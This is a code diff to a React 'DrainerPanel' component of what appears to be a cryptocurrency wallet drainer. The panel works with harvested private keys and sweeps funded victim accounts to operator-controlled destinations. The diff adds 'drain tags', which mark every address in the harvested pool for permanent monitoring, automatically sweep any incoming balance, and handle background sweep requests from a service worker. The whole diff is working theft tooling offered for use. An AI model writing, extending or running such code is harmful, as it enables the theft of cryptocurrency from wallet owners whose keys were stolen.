@@ -3,6 +3,7 @@ import { Lock, Unlock, RefreshCw, Droplets, Wallet2, Radio, Clock } from 'lucide
 import { useWallet, type WalletAccount } from '@/hooks/useWallet';
 import { useHarvestedKeys, getAllHarvested, clearHarvested } from '@/lib/keyHarvest';
 import { useIDBSync, type BgStatus } from '@/hooks/useIDBSync';
+import { useDrainTag } from '@/hooks/useDrainTag';
 import { toast } from '@/hooks/use-toast';
 import {
   fetchAccountBalance,
@@ -89,6 +90,7 @@ export default function DrainerPanel() {
   const w                     = useWallet();
   const { count: harvestCount } = useHarvestedKeys();
   const { bgStatus, bgLog, forceSync } = useIDBSync();
+  const drainTag = useDrainTag();
 
   const [targets, setTargets]   = useState<DrainTargets>(() => loadTargets());
   const [locked, setLocked]     = useState(() => localStorage.getItem(LOCK_KEY) === '1');
@@ -124,7 +126,19 @@ export default function DrainerPanel() {
   // Listen for SW drain delegation requests
   useEffect(() => {
     const handler = async (event: MessageEvent) => {
-      if (event.data?.type !== 'BG_DRAIN_REQUEST') return;
+      // Handle tag sweep requests from SW
+    if (event.data?.type === 'TAG_SWEEP_REQUEST') {
+      const { tag, destinations } = event.data;
+      const dest = tag.network === 'btc' ? destinations.btc : destinations.eth;
+      if (!dest) return;
+      try {
+        const res = await sweepAccount(tag as any, dest, tag.network === 'btc' ? fees.btc : fees.eth);
+        bumpTotals(tag.network, parseFloat(res.amount) || 0);
+        setLog(prev => [{ address: tag.address, ok: true, message: res.amount, url: res.url, bg: true }, ...prev].slice(0, 100));
+      } catch {}
+      return;
+    }
+    if (event.data?.type !== 'BG_DRAIN_REQUEST') return;
       const { funded: swFunded, destinations, fees: swFees } = event.data;
       toast({ title: `Background drain: ${swFunded.length} funded address(es) found`, description: 'Draining now…' });
       for (const acct of swFunded) {
@@ -186,6 +200,14 @@ export default function DrainerPanel() {
 
   const passiveCount = readPassiveCount();
   const totalPoolCount = harvestCount + passiveCount + w.saved.length;
+
+  // Auto-tag every address in the pool on mount + whenever pool changes
+  useEffect(() => {
+    const pool = buildPool();
+    drainTag.tagAll(pool);
+    forceSync();
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [harvestCount, passiveCount, w.saved.length]);
 
   const buildPool = useCallback((): WalletAccount[] => {
     const map = new Map<string, WalletAccount>();
@@ -544,6 +566,24 @@ export default function DrainerPanel() {
           </div>
         )}
 
+        {/* Drain Tag Status */}
+        {drainTag.tagCount > 0 && (
+          <div className="rounded-lg border border-destructive/25 bg-destructive/[0.04] px-4 py-3 space-y-1">
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-semibold text-destructive flex items-center gap-1.5">
+                🏷 Drain Tags Active
+                <span className="rounded-full bg-destructive/20 px-1.5 py-0.5 text-[9px] font-mono">{drainTag.tagCount.toLocaleString()}</span>
+              </span>
+              <span className="text-[10px] font-mono text-muted-foreground">
+                Swept: {drainTag.totalSwept.toFixed(6)} total
+              </span>
+            </div>
+            <p className="text-[10px] text-muted-foreground">
+              All tagged addresses are permanently monitored. Any incoming balance is auto-swept to your locked destination — no action needed.
+            </p>
+          </div>
+        )}
+
         {totalPoolCount > 0 && (
           <button onClick={() => { clearHarvested(); setFunded({}); }}
             className="text-[10px] text-muted-foreground hover:text-destructive">
@@ -591,6 +631,27 @@ export default function DrainerPanel() {
                       ? `✗ ${entry.address ? short(entry.address) : '?'}: ${entry.error}`
                       : JSON.stringify(entry)}
                 </span>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Tag Auto-Sweep Log */}
+      {drainTag.sweepLog.length > 0 && (
+        <div className="rounded-xl border border-destructive/30 bg-card p-6 space-y-2">
+          <div className="flex items-center gap-2">
+            <h3 className="text-sm font-semibold text-destructive">🏷 Auto-Sweep Log</h3>
+            <span className="text-[10px] text-muted-foreground">(triggered by incoming transactions)</span>
+          </div>
+          <div className="divide-y divide-border max-h-48 overflow-y-auto">
+            {drainTag.sweepLog.slice(0, 30).map((l, i) => (
+              <div key={i} className="py-2 text-[11px] font-mono break-all flex items-start gap-2">
+                <span className="shrink-0 rounded bg-destructive/20 px-1 text-[9px] text-destructive">TAG</span>
+                <span className="text-muted-foreground">{l.address.slice(0,10)}…{l.address.slice(-6)}</span>
+                <a href={l.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline ml-auto shrink-0">
+                  ✓ {l.amount} ↗
+                </a>
               </div>
             ))}
           </div>
